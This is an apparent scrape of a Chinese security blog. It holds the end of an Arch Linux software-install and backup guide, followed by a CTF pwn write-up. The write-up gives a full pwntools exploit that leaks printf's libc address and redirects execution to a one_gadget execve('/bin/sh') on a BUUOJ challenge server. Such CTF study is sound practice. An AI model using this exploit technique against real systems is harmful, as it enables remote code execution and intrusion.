<p>mpv — video player<br>Onboard —Virtual keyboard<br>okular   —PDF  viewer<br>vokoscrenn —Screen recorder<br>VirtualBox<br>scrot     —screen sniping<br>fcitx<br>nomacs  —Photos viewer<br>calc — cmd calclator<br>bc —calc<br>neofetch   —sysinfo</p>
<p>Security:<br>net-tools (ifconfig)<br>netdiscover (ip scan)<br>dirp (web scan)<br>kdenlive</p>
<h4 id="其他软件"><a href="#其他软件" class="headerlink" title="其他软件"></a>其他软件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#clang 大名鼎鼎的LLVM Clang C语言编译器</span></span><br><span class="line">sudo pacman -Sy clang</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb 也就是gcc的调试工具</span></span><br><span class="line">sudo pacman -Sy gdb</span><br><span class="line"></span><br><span class="line"><span class="comment">#cmake C语言构建工具</span></span><br><span class="line">sudo pacman -Sy cmake</span><br><span class="line"></span><br><span class="line"><span class="comment">#pip  python的模块工具</span></span><br><span class="line">sudo pacman -Sy python-pip</span><br><span class="line"></span><br><span class="line"><span class="comment">#kchmviewer  chm查看工具</span></span><br><span class="line">sudo pacman -Sy kchmviewer</span><br><span class="line"></span><br><span class="line">6.krita和gimp是类似的作图工具，和windows下的ps是一样的</span><br><span class="line">sudo pacman -Sy krita</span><br><span class="line"></span><br><span class="line">7.gimp 不多介绍和ps一样</span><br><span class="line">sudo pacman -Sy gimp</span><br><span class="line"></span><br><span class="line">8.obs-studio 录屏推流软件</span><br><span class="line">sudo pacman -Sy obs-studio</span><br><span class="line"></span><br><span class="line">10.libreoffice 中文版本</span><br><span class="line">sudo pacman -Sy libreoffice-fresh</span><br><span class="line">sudo pacman -Sy libreoffice-fresh-zh-cn</span><br><span class="line"></span><br><span class="line">11.jdk 默认最新的</span><br><span class="line">sudo pacman -Sy jdk</span><br><span class="line"></span><br><span class="line"><span class="comment">#当你安装多个jdk的时候设置环境变量会提醒你</span></span><br><span class="line"><span class="comment">#Default Java environment is already set to &#x27;java-12-jdk&#x27;</span></span><br><span class="line"><span class="comment">#See &#x27;archlinux-java help&#x27; to change it</span></span><br><span class="line"><span class="comment">#所以说我们只需要运行archlinux-java help这个命令就可以看到相关切换的设置了,一键切换jdk不再是梦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#go 默认最新</span></span><br><span class="line">sudo pacman -Sy go</span><br><span class="line"></span><br><span class="line"><span class="comment">#wps 金山办公软件</span></span><br><span class="line">sudo pacman -Sy wps-office</span><br><span class="line">sudo pacman -Sy ttf-wps-fonts</span><br><span class="line">yay -Sy wps-office-mime</span><br><span class="line">yay -Sy wps-office-mui-zh-cn</span><br><span class="line"></span><br><span class="line"><span class="comment">#freemind 思维导图</span></span><br><span class="line">sudo pacan -Sy freemind</span><br><span class="line"></span><br><span class="line"><span class="comment">#xmind-zen 思维导图</span></span><br><span class="line">yay -Sy xmind-zen(如非必要不要安装这个)</span><br><span class="line"></span><br><span class="line"><span class="comment">#filezilla 远程ftp工具</span></span><br><span class="line">sudo pacman -Sy filezilla</span><br><span class="line"></span><br><span class="line"><span class="comment">#drawio 类似UML之类的作图工具</span></span><br><span class="line">sudo pacman -Sy drawio-desktop-bin</span><br><span class="line"></span><br><span class="line"><span class="comment">#uget 下载管理器</span></span><br><span class="line">sudo pacman -Sy uget</span><br><span class="line"></span><br><span class="line"><span class="comment">#网易云音乐</span></span><br><span class="line">sudo pacman -Sy netease-cloud-music</span><br><span class="line"></span><br><span class="line"><span class="comment">#谷歌浏览器</span></span><br><span class="line">sudo pacman -Sy google-chrome</span><br><span class="line"></span><br><span class="line"><span class="comment">#TIM</span></span><br><span class="line">sudo pacman -Sy deepin.com.qq.office</span><br><span class="line"></span><br><span class="line"><span class="comment">#vlc播放器</span></span><br><span class="line">sudo pacman -Sy vlc</span><br><span class="line"></span><br><span class="line"><span class="comment">#mplayer命令行播放器</span></span><br><span class="line">sudo pacman -Sy mplayer</span><br><span class="line"></span><br><span class="line"><span class="comment">#smplayer 图像界面的播放器</span></span><br><span class="line">sudo pacman -Sy smplayer</span><br><span class="line"></span><br><span class="line"><span class="comment">#gpick 屏幕取色工具</span></span><br><span class="line">sudo pacman -Sy gpick</span><br><span class="line"></span><br><span class="line"><span class="comment">#htop 资源进程管理器 top命令的升级版</span></span><br><span class="line">sudo pacman -Sy htop</span><br><span class="line"></span><br><span class="line"><span class="comment">#Evolution 邮箱 强烈推荐</span></span><br><span class="line">sudo pacman -Sy evolution</span><br><span class="line"></span><br><span class="line"><span class="comment">#QQ</span></span><br><span class="line">sudo pacman -Sy deepin.com.qq.im(qq的bug较多)</span><br><span class="line"></span><br><span class="line"><span class="comment">#微信</span></span><br><span class="line">yay -Sy deepin-wine-wechat</span><br><span class="line"></span><br><span class="line"><span class="comment">#百度网盘</span></span><br><span class="line">sudo pacman -Sy baidunetdisk</span><br><span class="line"></span><br><span class="line"><span class="comment">#teamviewer 远程控制</span></span><br><span class="line">sudo pacman -Sy teamviewer</span><br><span class="line"></span><br><span class="line"><span class="comment">#screenfetch 系统信息查看工具</span></span><br><span class="line">sudo pacman -Sy screenfetch</span><br><span class="line"></span><br><span class="line"><span class="comment">#neofetch同screenfetch</span></span><br><span class="line">sudo pacman -Sy neofetch</span><br><span class="line"></span><br><span class="line"><span class="comment">#lolcat 文本查看 也就是cat命令的升级版</span></span><br><span class="line">sudo pacman -Sy lolcat</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以配合screefetch使用</span></span><br><span class="line"><span class="comment">#比如 screenfetch | lolcat，这条命令可以看到非常炫酷的效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#数据库安装mariadb</span></span><br><span class="line"><span class="comment">#因为很多linux发行版都放弃了对mysql的支持（原因自行百度）转而支持mariadb（mysql的另一个分支），Archlinux就是其中之一，mariadb具有和mysql一模一样的操作命令，所以完全不用考虑迁移兼容的问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意ArchLinux安装mysql是不可行的，不要试图安装mysql，那是不成功的</span></span><br><span class="line">	<span class="comment">#安装mariadb</span></span><br><span class="line">	sudo pacman -Sy mariadb</span><br><span class="line">	<span class="comment">#配置mariadb命令，创建数据库都在/var/lib/mysql/目录下面</span></span><br><span class="line">	sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql</span><br><span class="line">	<span class="comment">#开启mariadb 服务</span></span><br><span class="line">	systemctl start mariadb</span><br><span class="line">	<span class="comment">#初始化密码，期间有让你设置密码的选项，设置你自己的密码就行了，然后根据自己理解y/n就可，因为很多后面可以再修改 sudo /usr/bin/mysql_secure_installation</span></span><br><span class="line">	<span class="comment">#登录mariadb 和mysql命令是一样的</span></span><br><span class="line">	mysql -u root -p</span><br><span class="line"></span><br><span class="line">    <span class="comment">#设置开机自启动服务</span></span><br><span class="line">    systemctl start mariadb <span class="comment">#手动启动</span></span><br><span class="line">    systemctl <span class="built_in">enable</span> mariadb <span class="comment">#开机自启动</span></span><br><span class="line">    systemctl <span class="built_in">disable</span> mariadb <span class="comment">#关闭自启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Intellij IDEA</span></span><br><span class="line">sudo pacman -Sy intellij-idea-ultimate-edition</span><br><span class="line"></span><br><span class="line"><span class="comment">#WebStorm 前端</span></span><br><span class="line">sudo pacman -Sy webstorm</span><br><span class="line"></span><br><span class="line"><span class="comment">#DataGrip 数据库</span></span><br><span class="line">yay -Sy datagrip</span><br><span class="line"></span><br><span class="line"><span class="comment">#GoLand go</span></span><br><span class="line">sudo pacman -Sy goland</span><br><span class="line"></span><br><span class="line"><span class="comment">#PyCharm python</span></span><br><span class="line">sudo pacman -Sy pycharm-professional</span><br><span class="line"></span><br><span class="line"><span class="comment">#CLion</span></span><br><span class="line">sudo pacman -Sy clion</span><br><span class="line"></span><br><span class="line"><span class="comment">#baidupcs 百度网盘命令行版本(推荐)</span></span><br><span class="line">sudo pacman -Sy baidupcs-go-bin</span><br><span class="line"><span class="comment">#输入baidupcs启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gitter 开发者聊天交流社区软件</span></span><br><span class="line">sudo pacman -Sy gitter</span><br><span class="line"></span><br><span class="line"><span class="comment">#opera 浏览器(未安装，感兴趣可以看看)</span></span><br><span class="line"></span><br><span class="line">sudo pacman -Sy opera</span><br><span class="line"></span><br><span class="line"><span class="comment">#米聊  小米的社交聊天工具</span></span><br><span class="line">yay -Sy mitalk</span><br><span class="line"></span><br><span class="line"><span class="comment">#vscode 微软的代码编辑器</span></span><br><span class="line">sudo pacman -Sy code</span><br><span class="line"></span><br><span class="line"><span class="comment">#atom  github为程序员打造的编辑器</span></span><br><span class="line">sudo pacman -Sy atom</span><br><span class="line"></span><br><span class="line"><span class="comment">#360压缩软件</span></span><br><span class="line">yay -Sy 360zip</span><br><span class="line"></span><br><span class="line"><span class="comment">#360浏览器</span></span><br><span class="line">yay -Sy browser360</span><br><span class="line"></span><br><span class="line"><span class="comment">#微信（未安装）</span></span><br><span class="line">yay -Sy electronic-wechat</span><br><span class="line"></span><br><span class="line"><span class="comment">#磁盘管理工具</span></span><br><span class="line">sudo pacman -S gparted</span><br><span class="line"></span><br><span class="line"><span class="comment">#影视处理</span></span><br><span class="line">yay -Sy davinci-resolve</span><br><span class="line"><span class="comment">#为免费版本，34为studio版本可能功能更全但要付费</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#声音设置相关</span></span><br><span class="line">sudo pacman -Sy pavucontrol</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Backup-And-Recovery"><a href="#Backup-And-Recovery" class="headerlink" title="Backup And Recovery"></a>Backup And Recovery</h3><h4 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h4><p>gzip压缩</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">tar cvpzf myarchbp.tgz --exclude=/proc --exclude=/sys --exclude=/lost+found \</span><br><span class="line">--exclude=/mnt --exclude=/media --exclude=/myarchbp.tgz /</span><br></pre></td></tr></table></figure>
<p>在档案文件名”backup.gz”和要备份的目录名”/“之间给出了备份时必须排除在外的目录,<br>有些目录是无用的,例如”/proc”,”/lost+ found”,”/sys”,当然,”backup.gz”这个档案文<br>件本身必须排除在外,否则你可能会得到一些超出常理的结果.如果不把”/mnt”排 除在外,<br>那么挂载在”/mnt”上的其它分区也会被备份.另外需要确认一下”/media”上没有挂载任何东西<br>例如光盘,移动硬盘,如果有挂载东西.必须把 /media也排除在外</p>
<p>在备份命令结束时你可能会看到这样一个提示:”tar: Error exit delayed from previous errors”<br>多数情况下可以忽略它.</p>
<h4 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery:"></a>Recovery:</h4><p>U盘启动挂载复制之后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">tar xvpfz backup.tgz -C /</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建目录:</span></span><br><span class="line">mkdir proc</span><br><span class="line">mkdir lost+found</span><br><span class="line">mkdir mnt</span><br><span class="line">mkdir sys</span><br><span class="line">mkdir -p media/disk</span><br></pre></td></tr></table></figure>

<h3 id="pacman常用参数"><a href="#pacman常用参数" class="headerlink" title="pacman常用参数"></a>pacman常用参数</h3><p>更新<br>pacman -Sy<br>更新软件库(类似apt-get update)<br>pacman -Syy<br>强制更新软件库<br>pacman -Su<br>更新软件(类似apt-get upgrade)<br>pacman -Syu<br>更新软件库并更新软件<br>pacman -Syyu<br>强制更新软件库并更新软件<br>查询<br>pacman -Ss [name]<br>查询[name]软件<br>pacman -Q<br>列出所有本地已安装的软件包括系统软件<br>pacman -Qe<br>列出所有本地自己已安装的软件详细信息<br>pacman -Qeq<br>列出所有本地自己已安装的软件(只有软件名，没有版本号)<br>pacman -Qs [name]<br>查询已安装的[name]软件信息<br>pacman -Qdt<br>查询没有被任何软件依赖的依赖软件详细信息(没有任何作用)<br>pacman -Qdtq<br>查询没有被任何软件依赖的依赖软件(只有软件名)<br>安装<br>pacman -S [name]<br>安装[name]软件<br>清除缓存<br>pacman -Sc<br>清除安装包缓存(一般在/var/cache/pacman/pkg/下)<br>卸载<br>pacman -R [name]<br>卸载[name]软件<br>pacman -Rs [name]<br>卸载[name]软件以及依赖软件<br>pacman -Rns [name]<br>卸载[name]软件以及依赖软件以及全局配置文件<br>pacman -R $(pacman -Qdtq)<br>卸载所有没有被任何软件依赖的依赖软件</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/03/install-arch-linux-and-config/" data-id="ckhemv84i005dwdcm52jvhkx2" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-one-gadget" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/03/wp-one-gadget/" class="article-date">
  <time datetime="2020-04-03T04:10:35.000Z" itemprop="datePublished">2020-04-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/03/wp-one-gadget/">wp one gadget</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="One-Gadget"><a href="#One-Gadget" class="headerlink" title="One Gadget"></a>One Gadget</h1><p>one-gadget 是glibc里调用<code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code>的一段非常有用的gadget。在我们能够控制ip（也就是pc）的时候，用one-gadget来做RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用<code>system(&quot;sh&quot;)</code>，这个时候one gadget就可以搞定了</p>
<p>使用one_gadget工具进行获取oen_gadget</p>
<p>one_gadget工具安装:</p>
<p>github: <a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ruby</span><br><span class="line">sudo apt install gem</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>

<p>通过ida查看伪代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> (*v4)(<span class="keyword">void</span>); <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"><span class="keyword">void</span> (*v5)(<span class="keyword">void</span>); <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Give me your one gadget:&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">v5 = v4;</span><br><span class="line">v4();</span><br></pre></td></tr></table></figure>

<p>思路: 通过init打印出printf在libc中的地址, 然后计算libc基地址, 使用one_gadget打shell</p>
<p>exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;one_gadget&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;./libc-2.29.so&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;node3.buuoj.cn&quot;</span></span><br><span class="line">remotePort = <span class="number">26163</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	print_addr = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	li(<span class="string">&#x27;print_addr:&#x27;</span> + <span class="built_in">hex</span>(print_addr))</span><br><span class="line">	lib_base = print_addr - lib.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">	one_gadget =[<span class="number">0xe237f</span>,<span class="number">0xe2383</span>,<span class="number">0xe2386</span>,<span class="number">0x106ef8</span>]</span><br><span class="line"></span><br><span class="line">	sh = lib_base + one_gadget[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;lib_base:&#x27;</span> + <span class="built_in">hex</span>(lib_base))</span><br><span class="line">	li(<span class="string">&#x27;OG addr:&#x27;</span> + <span class="built_in">hex</span>(sh))</span><br><span class="line">	ru(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">	p = <span class="built_in">str</span>(sh)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	sl(p)</span><br><span class="line">	<span class="comment">#a = 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">		io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="comment">#io = exe.process()</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	pwn@Ubuntu:~/share$ one_gadget libc-2.29.so</span></span><br><span class="line"><span class="string">	0xe237f execve(&quot;/bin/sh&quot;, rcx, [rbp-0x70])</span></span><br><span class="line"><span class="string">	constraints:</span></span><br><span class="line"><span class="string">	[rcx] == NULL || rcx == NULL</span></span><br><span class="line"><span class="string">	[[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	0xe2383 execve(&quot;/bin/sh&quot;, rcx, rdx)</span></span><br><span class="line"><span class="string">	constraints:</span></span><br><span class="line"><span class="string">	[rcx] == NULL || rcx == NULL</span></span><br><span class="line"><span class="string">	[rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	0xe2386 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">	constraints:</span></span><br><span class="line"><span class="string">    [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">	[rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	0x106ef8 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">	constraints:</span></span><br><span class="line"><span class="string">	[rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/03/wp-one-gadget/" data-id="ckhemv833003hwdcmc8o2chh7" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-高校战役" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
